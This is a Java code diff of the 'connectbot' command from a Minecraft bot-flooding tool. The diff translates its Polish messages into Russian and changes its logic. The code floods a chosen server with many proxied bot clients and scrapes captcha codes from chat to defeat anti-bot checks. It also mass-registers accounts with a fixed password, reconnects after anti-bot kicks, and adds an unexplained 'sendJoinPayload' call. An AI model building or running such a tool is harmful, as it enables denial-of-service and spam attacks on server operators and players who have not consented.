@@ -17,29 +17,29 @@ import org.spacehq.packetlib.Client;
 import org.spacehq.packetlib.Session;
 import org.spacehq.packetlib.event.session.*;
 import org.spacehq.packetlib.tcp.TcpSessionFactory;
+import ru.crashdami.emortality.Group;
+import ru.crashdami.emortality.managers.MacroManager;
+import ru.crashdami.emortality.managers.ProxyManager;
 import ru.crashdami.emortality.objects.Bot;
 import ru.crashdami.emortality.objects.Macro;
 import ru.crashdami.emortality.objects.Player;
 import ru.crashdami.emortality.command.Command;
-import ru.crashdami.emortality.enums.Group;
-import ru.crashdami.emortality.managers.MacroManager;
-import ru.crashdami.emortality.managers.ProxyManager;
+import ru.crashdami.emortality.utils.PacketUtil;
 
-import java.net.InetSocketAddress;
 import java.net.Proxy;
 import java.util.Random;
 
 public class ConnectBotCommand extends Command {
 
     public ConnectBotCommand() {
-        super("connectbot", "Атакуйте сервер ботами!", ",connectbot [serwer:port] [ilosc] [ping] [delay w ms] [proxy/none/random/] [macro id/none]",
-                Group.PLAYER, "joinbot", "connectbots", "joinbots");
+        super("connectbot", "Заспамить сервер ботами!", ",connectbot [сервер:порт] [количество] [пинг] [задержка] [тип прокси: none/private] [айди макро/none]",
+                Group.USER, "joinbot", "connectbots", "joinbots");
     }
 
     @Override
     public void onCommand(Player p, Command command, String[] args) {
         if (args.length == 0 || args.length < 7) {
-            p.sendMessage("$p &7Poprawne uzycie: &a" + getUsage());
+            p.sendMessage("$p &7Правильное использование: &b" + getUsage());
             return;
         } else {
             final String host = args[1].split(":")[0];
@@ -54,17 +54,17 @@ public class ConnectBotCommand extends Command {
             } else {
                 macro = MacroManager.getMacroById(Integer.parseInt(args[6]));
             }
-            if (args[5].contains(":")) {
+            /*if (args[5].contains(":")) {
                 proxy = new java.net.Proxy(java.net.Proxy.Type.SOCKS,
                         new InetSocketAddress(args[5].split(":")[0],
                                 Integer.valueOf(args[5].split(":")[1])));
-                p.sendMessage("$p &7Ip proxy: &aspecified&7 &8(&7" + proxy.address().toString().split(":")[0] + ":"
-                        + proxy.address().toString().split(":")[1] + "&8)");
-            } else if (args[5].contains("random") || args[5].contains("top")) {
+                p.sendMessage("$p &7Айпи прокси: &bspecified&7 &8(&7" + proxy.address().toString().split(":")[0] + ":"
+                        + proxy.address().toString().split(":")[1] + "&8)");*/
+            if (args[5].contains("private") || args[5].contains("top")) {
                 proxy = null;
-                p.sendMessage("$p &7Ip proxy: &arandom from list socks.txt");
+                p.sendMessage("$p &7Прокси: &bprivate");
             } else {
-                p.sendMessage("$p &7Ip proxy: &anull &8(&70:0&8)");
+                p.sendMessage("$p &7Прокси: &bnull &8(&70:0&8)");
                 proxy = java.net.Proxy.NO_PROXY;
             }
             connectBots(p, amount, host, port, delay, ping, proxy, macro);
@@ -72,10 +72,10 @@ public class ConnectBotCommand extends Command {
     }
 
     private void connectBots(Player owner, int amount, String host, Integer port, long msDelay, boolean ping, Proxy proxy, Macro macro) {
-        owner.sendMessage("$p &a" + amount + " &7botow laczy do: &a"
-                + host + " &8(" + port + ")&7, wykonuja macro ID: &a" + ((macro == null) ? "none" :
-                Integer.toString(macro.getId())) + "\n $p &7Powiadomienia beda wyswietlane co kilkanascie botow");
-        //owner.sendMessage("$p &7Boty lacza za chwile do serwera: &a" + host + "&7, delay: &a" + msDelay + "ms&7, ilosc botow: &a" + amount);
+        owner.sendMessage("$p &b" + amount + " &7Ботов подключаются на сервер: &b"
+                + host + " &8(" + port + ")&7, Айди макроса: &b" + ((macro == null) ? "none" :
+                Integer.toString(macro.getId())));
+        //owner.sendMessage("$p &7Boty lacza za chwile do serwera: &b" + host + "&7, delay: &b" + msDelay + "ms&7, ilosc botow: &b" + amount);
         final Random rand = new Random();
         final Proxy proksi;
         if (proxy == null)
@@ -86,22 +86,22 @@ public class ConnectBotCommand extends Command {
 
             final int i2 = i + 1;
             new Thread(() -> {
-                    final String nick = "Emortality" + rand.nextInt(1000);
+                final String nick = rand.nextInt(99999) + "_e";
                 connectBot(owner, nick, host, port, ping, msDelay, proksi, macro, i2, amount, true);
-                if (msDelay != 0) {
-                    try {
-                        Thread.sleep(msDelay);
-                    } catch (InterruptedException ex) {
-                        owner.sendMessage("$p &cDelay nieudany! &7" + ex.getMessage());
-                    }
-                }
             }).start();
+            if (msDelay != 0) {
+                try {
+                    Thread.sleep(msDelay);
+                } catch (InterruptedException ex) {
+                    owner.sendMessage("$p &cОшибка! &7" + ex.getMessage());
+                }
+            }
         }
     }
 
     private void connectBot(Player owner, String nick, String host, int port, boolean ping, long msDelay, Proxy proxy, Macro macro, final int amount, final int maxamount, boolean msg) {
         if (amount == 1 || amount == 10 || amount == 25 || amount == 40 || amount == 50 || amount == 70 || amount == 90 || amount == 100 || amount == 150 || amount == 200 || amount == 250 || amount == 300 || amount == 350 || amount == 400 || amount == 450 || amount == 500 || amount == 550 || amount == 600 || amount == 700 || amount == 800 || amount == 900 || amount == 1000) {
-            owner.sendMessage("$p &aBot &7" + nick + " &a(ilosc: " + amount + "/" + maxamount + ", proxy: " + ((proxy == null || proxy == Proxy.NO_PROXY) ? "null, ip: 0, port: 0" : ("SOCKS, ip: " + proxy.address().toString().split(":")[0] + ", port: " + proxy.address().toString().split(":")[1])) + " &alaczy do: &7" + host + ":" + port + "&a)");
+            owner.sendMessage("$p &bБот &7" + nick + " &b(количество: " + amount + "/" + maxamount + ", прокси: " + ((proxy == null || proxy == Proxy.NO_PROXY) ? "null, ip: 0, port: 0" : ("SOCKS, ip: " + proxy.address().toString().split(":")[0] + ", port: " + proxy.address().toString().split(":")[1])) + " &blaczy do: &7" + host + ":" + port + "&b)");
         }
         final Client c = new Client(host, port, new MinecraftProtocol(nick), new TcpSessionFactory(proxy));
         c.getSession().setConnectTimeout(owner.botOptions.timeOutConnect);
@@ -112,7 +112,7 @@ public class ConnectBotCommand extends Command {
             client.getSession().setFlag("server-info-handler", new ServerInfoHandler() {
                 @Override
                 public void handle(final Session session, final ServerStatusInfo info) {
-                    client.getSession().disconnect("zpingowano.");
+                    client.getSession().disconnect("пингуется.");
                 }
             });
             client.getSession().connect();
@@ -125,34 +125,39 @@ public class ConnectBotCommand extends Command {
                 if (e.getPacket() instanceof ServerChatPacket) {
                     if (owner.playerOptions.chatFromBots && ((ServerChatPacket) e.getPacket()).getMessage() != null) {
                         if (((ServerChatPacket) e.getPacket()).getType() != MessageType.CHAT) return;
-                        owner.sendMessage("&7[Bot &a" + nick + "&7]");
+                        owner.sendMessage("&7[Бот &b" + nick + "&7]");
                         owner.sendMessage(((ServerChatPacket) e.getPacket()).getMessage().getText());
-                        owner.sendMessage("&7[Bot &a" + nick + "&7]");
+                        owner.sendMessage("&7[Бот &b" + nick + "&7]");
                     }
                 }
                 //autocaptcha
                 if (e.getPacket() instanceof ServerChatPacket) {
+                    PacketUtil.sendJoinPayload(e.getSession());
                     if (owner.botOptions.autoCaptcha) {
                         if (e.getSession().getHost().contains("proxy")) return;
                         final ServerChatPacket p3 = e.getPacket();
-                        if (p3.getMessage().toString().toLowerCase().contains("captcha:") || p3.getMessage().toString().toLowerCase().contains("kod:")) {
+                        if (p3.getMessage().toString().toLowerCase().contains("captcha:") || p3.getMessage().toString().toLowerCase().contains("капчу:") || p3.getMessage().toString().toLowerCase().contains("капч") || p3.getMessage().toString().toLowerCase().contains("код") || p3.getMessage().toString().toLowerCase().contains("code")) {
                             if (e.getSession().getHost().contains("megaxcore")) return;
                             final String message = p3.getMessage().toString();
                             final String[] args2 = message.split(":");
                             if (args2.length < 2 || args2[1] == null) return;
                             args2[1] = args2[1].replace(" ", "");
-                            e.getSession().send(new ClientChatPacket("/register " + args2[1] + " cproxy123 cproxy123"));
-                            e.getSession().send(new ClientChatPacket("/register cproxy123 cproxy123 " + args2[1]));
-                            //owner.sendMessage("$p &7Wykryto kod captcha: &a" + args2[1]);
-                        } else if (p3.getMessage().toString().toLowerCase().contains("kod") && p3.getMessage().toString().toLowerCase().contains("to")) {
+                            owner.sendMessage("$p &7Капча решена: &b" + args2[1]);
+                            e.getSession().send(new ClientChatPacket("/captcha " + args2[1]));
+                            e.getSession().send(new ClientChatPacket(args2[1]));
+                            e.getSession().send(new ClientChatPacket("/register " + args2[1] + " ebot123qweqweaa ebot123qweqweaa"));
+                            e.getSession().send(new ClientChatPacket("/register ebot123qweqweaa ebot123qweqweaa " + args2[1]));
+                        } else if (p3.getMessage().toString().toLowerCase().contains("captcha:") || p3.getMessage().toString().toLowerCase().contains("капчу:") || p3.getMessage().toString().toLowerCase().contains("капч:") || p3.getMessage().toString().toLowerCase().contains("код:") || p3.getMessage().toString().toLowerCase().contains("code:")) {
                             if (e.getSession().getHost().contains("megaxcore")) return;
                             final String message = p3.getMessage().toString();
                             final String[] args2 = message.split("to ");
                             if (args2.length < 2 || args2[1] == null) return;
                             args2[1] = args2[1].replace(" ", "");
-                            //p.sendMessage("$p &7Wykryto kod captcha: &a" + args2[1]);
-                            e.getSession().send(new ClientChatPacket("/register " + args2[1] + " cproxy123 cproxy123"));
-                            e.getSession().send(new ClientChatPacket("/register cproxy123 cproxy123 " + args2[1]));
+                            owner.sendMessage("$p &7Капча решена: &b" + args2[1]);
+                            e.getSession().send(new ClientChatPacket("/captcha " + args2[1]));
+                            e.getSession().send(new ClientChatPacket(args2[1]));
+                            e.getSession().send(new ClientChatPacket("/register " + args2[1] + " ebot123qweqweaa ebot123qweqweaa"));
+                            e.getSession().send(new ClientChatPacket("/register ebot123qweqweaa ebot123qweqweaa " + args2[1]));
                         }
                     }
                     return;
@@ -175,18 +180,20 @@ public class ConnectBotCommand extends Command {
                                 args2[1] = args2[1].replace("§a", "");
                                 args2[1] = args2[1].replace("§b", "");
                                 args2[1] = args2[1].replace("§2", "");
-                                e.getSession().send(new ClientChatPacket("/register " + args2[1] + " cproxy123 cproxy123"));
-                                e.getSession().send(new ClientChatPacket("/register cproxy123 cproxy123 " + args2[1]));
+                                e.getSession().send(new ClientChatPacket("/captcha " + args2[1]));
+                                e.getSession().send(new ClientChatPacket(args2[1]));
+                                e.getSession().send(new ClientChatPacket("/register " + args2[1] + " ebot123qweqweaa ebot123qweqweaa"));
+                                e.getSession().send(new ClientChatPacket("/register ebot123qweqweaa ebot123qweqweaa " + args2[1]));
                             }
                         }
                     }
                 }
                 if (e.getPacket() instanceof ServerJoinGamePacket) {
                     if (owner.botOptions.join)
-                        owner.sendMessage("$p &7Bot &a" + nick + "&7 dolaczyl do serwera: &a" + host + ":" + port + " &8(&a" + amount + "&7/&2" + maxamount + "&8)");
+                        owner.sendMessage("$p &7Бот &b" + nick + "&7 подключился : &b" + host + ":" + port + " &8(&b" + amount + "&7/&2" + maxamount + "&8)");
                     if (owner.botOptions.autoLogin) {
-                        c.getSession().send(new ClientChatPacket("/register cproxy123 cproxy123"));
-                        c.getSession().send(new ClientChatPacket("/l cproxy123"));
+                        c.getSession().send(new ClientChatPacket("/register ebot123qweqweaa ebot123qweqweaa"));
+                        c.getSession().send(new ClientChatPacket("/l ebot123qweqweaa"));
                     }
                     c.getSession().send(new ClientKeepAlivePacket(1));
                     if (macro != null)
@@ -198,7 +205,7 @@ public class ConnectBotCommand extends Command {
                             packet.getReason().getFullText().toLowerCase().contains("bot") ||
                             packet.getReason().getFullText().toLowerCase().contains("wejdz")) {
                         if (owner.botOptions.quit)
-                            owner.sendMessage("&c[AntyBot] &7Bot &a" + nick + "&7 zostal rozlaczony z &a" + host + "&7, powod: &a" + packet.getReason());
+                            owner.sendMessage("&c[Антибот] &7Бот &b" + nick + "&7 отключился &b" + host + "&7, причина: &b" + packet.getReason());
                         if (owner.botOptions.autoReconnect) {
                             if (owner.botOptions.autoReconnectTime > 0) {
                                 try {
@@ -206,12 +213,12 @@ public class ConnectBotCommand extends Command {
                                 } catch (InterruptedException ex) {
                                 }
                             }
-                            c.getSession().disconnect("antybot");
+                            c.getSession().disconnect("antibot");
                             connectBot(owner, nick, host, port, ping, msDelay, proxy, macro, amount, maxamount, false);
                         }
                     } else {
                         if (owner.botOptions.quit)
-                            owner.sendMessage("&7Bot &a" + nick + "&7 zostal rozlaczony z &a" + host + "&7, powod: &a" + packet.getReason());
+                            owner.sendMessage("&7Бот &b" + nick + "&7 отключился от &b" + host + "&7, причина: &b" + packet.getReason());
                     }
                 } else if (e.getPacket() instanceof LoginDisconnectPacket) {
                     final LoginDisconnectPacket packet = e.getPacket();
@@ -219,7 +226,7 @@ public class ConnectBotCommand extends Command {
                             packet.getReason().getFullText().toLowerCase().contains("bot") ||
                             packet.getReason().getFullText().toLowerCase().contains("wejdz")) {
                         if (owner.botOptions.quit)
-                            owner.sendMessage("&c[AntyBot] &7Bot &a" + nick + "&7 zostal rozlaczony z &a" + host + "&7, powod: &a" + packet.getReason());
+                            owner.sendMessage("&c[Антибот] &7Бот &b" + nick + "&7 отключился от &b" + host + "&7, причина: &b" + packet.getReason());
                         c.getSession().disconnect("antybot");
                         if (owner.botOptions.autoReconnect) {
                             if (owner.botOptions.autoReconnectTime > 0) {
@@ -232,7 +239,7 @@ public class ConnectBotCommand extends Command {
                         connectBot(owner, nick, host, port, ping, msDelay, proxy, macro, amount, maxamount, false);
                     } else {
                         if (owner.botOptions.quit)
-                            owner.sendMessage("&7Bot &a" + nick + "&7 zostal rozlaczony z &a" + host + "&7, powod: &a" + packet.getReason());
+                            owner.sendMessage("&7Бот &b" + nick + "&7 отключился от &b" + host + "&7, причина: &b" + packet.getReason());
                     }
                 }
             }
@@ -254,10 +261,10 @@ public class ConnectBotCommand extends Command {
             @Override
             public void disconnected(DisconnectedEvent e) {
                 owner.removeBot(bot);
-                if (e.getReason().toLowerCase().contains("antybot") || e.getReason().contains("wejdz") ||
-                        e.getReason().contains("zaloguj")) {
+                if (e.getReason().toLowerCase().contains("antibot") || e.getReason().contains("wejdz") ||
+                        e.getReason().contains("забанен")) {
                     if (owner.botOptions.quit)
-                        owner.sendMessage("&c[AntyBot] &7Bot &a" + nick + "&7 zostal rozlaczony z &a" + host + "&7, powod: &a" + e.getReason() + "&7, cause: &a"
+                        owner.sendMessage("&c[Антибот] &7Бот &b" + nick + "&7 отключился от &b" + host + "&7, причина: &b" + e.getReason() + "&7, подробнее: &b"
                                 + e.getCause().getMessage());
                     c.getSession().disconnect("antybot");
                     if (owner.botOptions.autoReconnect) {
@@ -271,7 +278,7 @@ public class ConnectBotCommand extends Command {
                     connectBot(owner, nick, host, port, ping, msDelay, proxy, macro, amount, maxamount, false);
                 } else {
                     if (owner.botOptions.quit)
-                        owner.sendMessage("&7Bot &a" + nick + "&7 zostal rozlaczony z &a" + host + "&7, powod: &a" + e.getReason() + "&7, cause: &a"
+                        owner.sendMessage("&c[Антибот] &7Бот &b" + nick + "&7 отключился от &b" + host + "&7, причина: &b" + e.getReason() + "&7, подробнее: &b"
                                 + e.getCause().getMessage());
                 }
             }
